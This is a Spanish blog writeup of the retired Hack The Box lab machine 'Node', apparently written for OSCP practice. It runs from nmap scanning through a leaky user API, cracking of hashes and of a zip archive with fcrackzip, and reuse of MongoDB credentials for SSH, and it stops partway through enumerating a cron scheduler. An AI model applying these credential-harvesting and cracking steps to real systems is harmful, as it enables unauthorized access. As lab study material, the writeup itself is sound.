---
layout: post
title:  "OSCP Path ~ Node de Hack The Box (Necesario VIP)"
description: Writeup de la maquina de HackTheBox llamada NODE siguiendo el PATH para el OSCP
tags: HTB, OSCP Path, app-js, fcrackzip, MongoDB, Scheduler, Cron-taks, Maquinas Retiradas, Writeup, Hacking
---

# Node ~ Hack The Box to OSCP

Realizamos el Primer escaneo con Nmap
```bash
$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10.58       "
``` 
Procedemos con el siguiente escaneo de Nmap
```bash
		PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-datanode Apache Hadoop
| hadoop-datanode-info: 
|_  Logs: /login
| hadoop-tasktracker-info: 
|_  Logs: /login
|_http-title: MyPlace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Entramos para visualizar la web por el puerto 3000

Hacemos CTRL + U

Encontramos esto en js que hace referencia a una app pinchamos en + /profile/`
```js
<script type="text/javascript" src="assets/js/app/controllers/profile.js"></script>
```
hacemos una peticion `Curl` 
```bash
Procedemos pinchando en /assets/js/app/controllers/profile.js
# curl -s -X GET "http://10.10.10.58:3000/assets/js/app/controllers/profile.js"                                                                                                                               4 ⨯
var controllers = angular.module('controllers');

controllers.controller('ProfileCtrl', function ($scope, $http, $routeParams) {
  $http.get("'/api/users/'" + $routeParams.username)
    .then(function (res) {
      $scope.user = res.data;
    }, function (res) {
      $scope.hasError = true;

      if (res.status == 404) {
        $scope.errorMessage = 'This user does not exist';
      }
      else {
        $scope.errorMessage = 'An unexpected error occurred';
      }
    });
});
```
Nos devuelve una ruta potencial: /api/users/
Procedemos a apuntar a ella y encontramos unas credenciales
```bash
# curl -s -X GET "http://10.10.10.58:3000/api/users/" |  jq                                                                                                                                                 123 ⨯
[
  {
    "_id": "59a7365b98aa325cc03ee51c",
    "username": "myP14ceAdm1nAcc0uNT",
    "password": "dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af",
    "is_admin": true
  },
  {
    "_id": "59a7368398aa325cc03ee51d",
    "username": "tom",
    "password": "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
    "is_admin": false
  },
  {
    "_id": "59a7368e98aa325cc03ee51e",
    "username": "mark",
    "password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
    "is_admin": false
  },
  {
    "_id": "59aa9781cced6f1d1490fce9",
    "username": "rastating",
    "password": "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
    "is_admin": false
  }
]
```
Credenciales:
```bash
User que es admin
user: myP14ceAdm1nAcc0uNT
pass: manchester
```
Accedemos -- nos descargamos un archivo : `myplace.backup`

Le hacemos un cat al archivo vemos que esta en base64 asique procedemos a decodificarlo
```bash
# cat myplace.backup| base64 -d >> myplace
# file myplace     
myplace: Zip archive data, at least v1.0 to extract
# 7z x myplace  ------- NOS PIDE CONTRASEÑA
```
Procdemos a intentar crackearlo con la herramienta fcrackzip
```bash
# ls
myplace  myplace.backup
# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt -v myplace 
PASSWORD FOUND!!!!: pw == "magicword"
```
Vemos que hemos obtenido un monton de directorios con recursos, nos metemops en `/var/www/myplace`

Filtramos por una busqueda para encontrar datos relevantes en los archivos
```bash
# cat app.js | grep -i -E "user|pass|db"                                                                                                                                                                      1 ⨯
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
```
Credenciales Obtenidas:
```bash
mark: 5AYRft73VtFpc84k
```
Entramos con estas credenciales por SSH por la reutilizacion de credenciales.
```bash
# ssh mark@10.10.10.58 

mark@node:~$ ls -la
total 24
drwxr-xr-x 3 root root 4096 Sep  3  2017 .
drwxr-xr-x 5 root root 4096 Aug 31  2017 ..
-rw-r--r-- 1 root root  220 Aug 31  2017 .bash_logout
-rw-r--r-- 1 root root 3771 Aug 31  2017 .bashrc
drwx------ 2 root root 4096 Aug 31  2017 .cache
-rw-r----- 1 root root    0 Sep  3  2017 .dbshell
-rwxr-xr-x 1 root root    0 Sep  3  2017 .mongorc.js
-rw-r--r-- 1 root root  655 Aug 31  2017 .profile
```
Intentando enumerar el sistema un poco vemos que tenemos en /var/ 

encontramos el directorio /scheduler/ que suele ser para tareas cron a nivel de sistema o tiene relacion
```bash
mark@node:/var/scheduler$ ls -l
total 20
-rw-rw-r--  1 root root  910 Sep  3  2017 app.js
drwxr-xr-x 19 root root 4096 Sep  3  2017 node_modules
-rw-rw-r--  1 root root  176 Sep  3  2017 package.json
-rw-r--r--  1 root root 4709 Sep  3  2017 package-lock.json
```
lanzamos un script `procmon`
para detectar tareas CRON a nivel de sistema
```bash
/usr/bin/mongod --auth --quiet --config /etc/mongod.conf
scheduler --?¿ -- Son tareas Cron a nivel de base de datos MONGO DB
> /usr/bin/node /var/scheduler/app.js
```
Probamos a conectarnos a la base de datos mongo que aparece bastante con las credenciales del 
```bash
user: mark
pass: 5AYRft73VtFpc84k
``` 
